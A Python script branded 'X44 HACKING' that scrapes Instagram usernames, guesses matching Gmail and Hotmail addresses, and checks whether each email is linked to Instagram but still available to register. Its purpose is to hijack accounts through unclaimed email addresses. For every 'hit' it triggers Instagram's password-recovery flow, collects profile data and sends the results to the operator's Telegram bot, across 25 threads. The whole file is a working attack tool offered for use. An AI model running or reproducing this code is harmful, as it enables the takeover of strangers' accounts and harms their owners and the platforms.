import os
try:
	import requests
	import threading
	import sys,random,json
	from Topython import Instagram , Email
	from random import choice,randrange
	from rich.panel import Panel as nel
	from rich import print as cetak
except ModuleNotFoundError:
	os.system('pip install ToPython')
	os.system('pip install Topython --upgrade ')
	os.system('pip install Pysocks')
	os.system('pip install curl2pyreqs')

def tokens():
    try:
        response = requests.get("https://tokens.pythonanywhere.com/").cookies.get_dict()
        Json = {
    "__Host_GAPS": response['__Host-GAPS'],
    "tl": response['TL'],
    "hl": response['hl'],
    "at": response['at'],
    "s1": response['s1'],
    "bl": "l7n"
}
        with open('meow.json', 'w') as file:
            json.dump(Json, file, indent=4)
        print(" Token has been saved in your device now restart tool ! ")    
        exit()
    except:
        tokens()		


Token = input('Enter Your Bot Token : ')
ID = input('ENTER YOUR USERID : ')

	
Hit = 0
Bad_Hit = 0
Bad = 0

def Check(email):
	global Hit,Bad_Hit,Bad
	sys.stdout.write(f"\r   \033[1;33m[\033[1;95mMeow\033[1;33m] -  OK :  {Hit}   CP :  {Bad_Hit}   :  {Bad} \r")
	sys.stdout.flush()  
	a = random.choice('12')
	if a == '1':
		Gmail(email)
	elif a == '2':
		Hotmail(email)
		
def Hotmail(email):
	global Hit,Bad_Hit,Bad	
	Besto = Instagram.CheckEmail(email + "@hotmail.com")
	if Besto:
		Check2(email)
	else:Bad+=1
	
def Gmail(email):
	global Hit,Bad_Hit,Bad	
	Besto = Instagram.CheckEmail(email + "@gmail.com")
	if Besto:
		Check_Gm(email)
	else:Bad+=1
				
def Check2(email):
	global Hit,Bad_Hit
	try:
		Besto2 = Email.hotmail(email)
		if Besto2:
			Hit+=1
			username = email
			Besto_Info(username)
		else:Bad_Hit+=1
	except Exception as e:
	        if "network" in str(e):
	           print('Ip blocked')
	        else:
	        	Gen_Users()
        

def Check_Gm(username):
    global Hit,Bad_Hit
    try:
    	open('meow.json','r').read()
    except FileNotFoundError:
    	tokens()
    email = username.split('@')[0]
    try:
        with open('meow.json', 'r') as file:
            filrs = json.load(file)
            __Host_GAPS = filrs['__Host_GAPS']
            tl = filrs['tl']
            hl = filrs['hl']
            at = filrs['at']
            s1 = filrs['s1']
            bl = filrs['bl']
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-same-domain': '1',
    }
                params = {
        'source-path': '/lifecycle/steps/signup/username',
        'bl': bl,
        'hl': hl,
        'TL': tl,
        'rt': 'c',
    }
                
                data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22'+email+'%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C2680%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )                              
                if '"er"' in str(response.text):
                    tokens()
                    Bad_Hit +=1
                    Check_Gm(username)
                elif 'password' in str(response.text):
                        Hit+=1 
                        Besto_Info2(username)
                else:                    
                    Bad_Hit +=1
            except Exception as e:
                return e
    except:
            tokens()	        		        	
	

           
def Besto_Info(username):
	headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
	data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
        'ig_sig_key_version': '4',
    }	
	try:
          response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
          rest = response.json()['email']
	except : rest = 'No Rest!'
	user = username
	info = Instagram.information(username=username)
	name = info['name']
	username = info['username']
	followers = info['followers']
	following = info['following']
	date = info['date']
	post = info['post']
	Ok = (f'''
💘X44 HACKING YOU GOT A HIT
•••••••••••••••••••••••••••••••••••••••••••
 🎯 Name : {name}
 🎯 Username : {username}
 🎯 Email : {user}@hotmail.com
 🎯 Followers : {followers}
 🎯 Following : {following}
 🎯 Date : {date}
 🎯 Post : {post}
 🎯 Rest : {rest}
 🎯  Link  : https://www.instagram.com/{username}
  🎯 FOLLOW https://t.me/+3sOXVM-Qx8I4NTg1
  •••••••••••••••••••••••••••••••••••••••••••''')
	Bes_Hh = nel(Ok, style='green')
	cetak(nel(Bes_Hh, title='[HAVING PROBLEM ]'))
	open('X44.txt','a').write(Ok+'\n')
	try:
		requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text="+str(Ok))	
	except:
		Okk = (f'''
 💘X44 HACKING YOU GOT A HIT
 •••••••••••••••••••••••••••••••••••••••••••
 🎯 Name : {name}
 🎯 Username : {username}
 🎯 Email : {user}@hotmail.com
 🎯 Rest : {rest}
 🎯  Link  : https://www.instagram.com/{username}
  🎯 FOLLOW https://t.me/+3sOXVM-Qx8I4NTg1
  •••••••••••••••••••••••••••••••••••••••••••''')
		requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text="+str(Okk))
		Bes_Hh = nel(Okk, style='green')
		cetak(nel(Bes_Hh, title='[HAVING PROBLEM ]'))
		open('X44.txt','a').write(Okk+'\n')


def Besto_Info2(username):
	headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
	data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
        'ig_sig_key_version': '4',
    }	
	try:
          response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
          rest = response.json()['email']
	except : rest = 'No Rest!'
	user = username
	info = Instagram.information(username=username)
	name = info['name']
	username = info['username']
	followers = info['followers']
	following = info['following']
	date = info['date']
	post = info['post']
	Ok = (f'''
 💘X44 HACKING YOU GOT A HIT
 •••••••••••••••••••••••••••••••••••••••••••
 🎯 Name : {name}
 🎯 Username : {username}
 🎯 Email : {user}@gmail.com
 🎯 Followers : {followers}
 🎯 Following : {following}
 🎯 Date : {date}
 🎯 Post : {post}
 🎯 Rest : {rest}
 🎯  Link  : https://www.instagram.com/{username}
  🎯 FOLLOW https://t.me/+3sOXVM-Qx8I4NTg1
  •••••••••••••••••••••••••••••••••••••••••••''')
	Bes_Hh = nel(Ok, style='green')
	cetak(nel(Bes_Hh, title='[HAVING PROBLEM ]'))
	open('X44.txt','a').write(Ok+'\n')
	try:
		requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text="+str(Ok))	
	except:
		Okk = (f'''
 💘X44 HACKING YOU GOT A HIT
 •••••••••••••••••••••••••••••••••••••••••••
 🎯 Name : {name}
 🎯 Username : {username}
 🎯 Email : {user}@gmail.com
 🎯 Rest : {rest}
 🎯  Link  : https://www.instagram.com/{username}
 🎯 FOLLOW https://t.me/+3sOXVM-Qx8I4NTg1
  •••••••••••••••••••••••••••••••••••••••••••''')
		requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text="+str(Okk))
		Bes_Hh = nel(Okk, style='green')
		cetak(nel(Bes_Hh, title='[SOME PROBLEM ]'))
		open('AAND MAND SAND','a').write(Okk+'\n')
		
		
def Gen_Users():
        Lett = [
"一右雨円王音下火花学気九休金空月見五口校左三山子四時出女小上森人水正生青夕石先早草足村大男中虫町天田土二日入年白八百文木本名目立力林六",
"アィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶ",
"あぃいぅうぇえぉおかがきぎくぐけげこごさざしじすずせぜそぞただちぢっつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをん",
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
"абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ",
        "پچژکگابتثجحخدذرزسشصضطظعغفقكلمنهوي",
        ]

        while True:
                name = random.choice(Lett)
                key = ''.join(random.choice(name) for _ in range(random.randint(2,4)))
                date = random.choice(["2010","2011","2012","2013"])
                keyword = key + date
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
                    'x-fb-friendly-name': 'PolarisSearchBoxRefetchableDirectQuery',
                }
                data = {
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisSearchBoxRefetchableDirectQuery',
                    'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+str(keyword)+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
                    'server_timestamps': 'true',
                    'doc_id': '7778489908879212',
                }
                try:
                    response = requests.post('https://www.instagram.com/graphql/query', cookies=None, headers=headers, data=data).json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
                    
                    for user in response:
                        email = user['user']['username']
                        if "_" not in email and len(email) > 5:
                            Check(email)
                except:
                    Gen_Users()
if __name__ == "__main__":
    for _ in range(25):
        threading.Thread(target=Gen_Users).start()
